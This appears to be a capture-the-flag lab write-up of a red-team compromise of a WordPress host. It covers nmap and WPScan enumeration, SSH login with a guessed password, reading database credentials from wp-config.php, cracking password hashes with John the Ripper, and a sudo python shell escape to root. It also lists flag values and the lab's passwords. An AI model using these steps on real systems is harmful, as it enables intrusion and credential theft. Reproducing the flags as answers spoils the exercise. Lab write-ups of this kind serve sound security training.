# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -O -sV 192.168.1.110
```
![Target 1 nmap scan](/images/1.png)

This scan identifies the services below as potential points of entry:
- Target 1
  - SSH (TCP port 22) - OpenSSH 6.7p1
  - HTTP (TCP port 80) - Apache 2.4.10
  - rpcbind (TCP port 111) - 2-4 (RPC #100000)
  - netbios-ssn (TCP port 139) - Samba 3.X - 4.X
  - microsoft-ds (TCP port 445) - Samba 3.X - 4.X

The following vulnerabilities were identified on each target:
- Target 1
  - User enumeration via WPScan.
  - Weak user passwords (easily guessable).
  - Poor directory access control.
  - Sensetive information in publically viewable files.
  - Privilege escalation via sudo access to python.

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
    - **Exploit Used**
      - WPScan to enumerate publically accessible users for the wordpress server.
      - wpscan --url 192.168.1.110/wordpress --enumerate u
      - ![WPScan users result]()

      - Guessed password for user michael to gain access to server via SSH.
      - Password: michael
      - ![SSH access gained]()

      - Navigated to /var/www/html and used `cat` to find flag1.
      - ![Flag1]()

  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used**
      - While logged in as user michael, navigated to /var/www (default directory for apache websites) and used cat to obtain flag.
      - `cd /var/www`
      - `cat flag2.txt`
      - ![Flag 2]()

  - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - Found the MySQL root user password in /var/www/html/wordpress/wp-config.php.
      - `cd /var/www/html/wordpress`
      - `cat wp-config.php`
      - Root password: R@v3nSecurity
      - ![wp-config.php]()

      - Using the root credentials, logged into the MySQL database and manually checked all tables. Flag 3 found in wp_posts
      - `mysql -u root -p`
      - `SHOW DATABASES;`
      - `USE wordpress;`
      - `SHOW TABLES;`
      - `SELECT * FROM wp_posts;`
      - ![Flag 3]()

  - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - Found user hashes within the MySQL database table `wp_users` for users `michael` and `steven`. Used `john the ripper` to crack the hash for `steven`.
      - `SELECT * FROM wp_users;`
      - ![wp_users]()

      - `john wp_hashes.txt`
      - Password: pink84
      - ![john]()

      - Logged in as user `steven` onto the server and checked if user had sudo permissons.
      - `ssh steven@192.168.1.110`
      - `sudo -l`
      - ![steven ssh & sudo]()

      - Used the below python script to elevate permissions to the `root` user, navigated to the `root` user's home directory and used `cat` to obtain flag4.
      - `sudo python -c 'import os; os.system("/bin/sh")'`
      - `cd ~`
      - `cat flag4.txt`
      - ![flag4]()

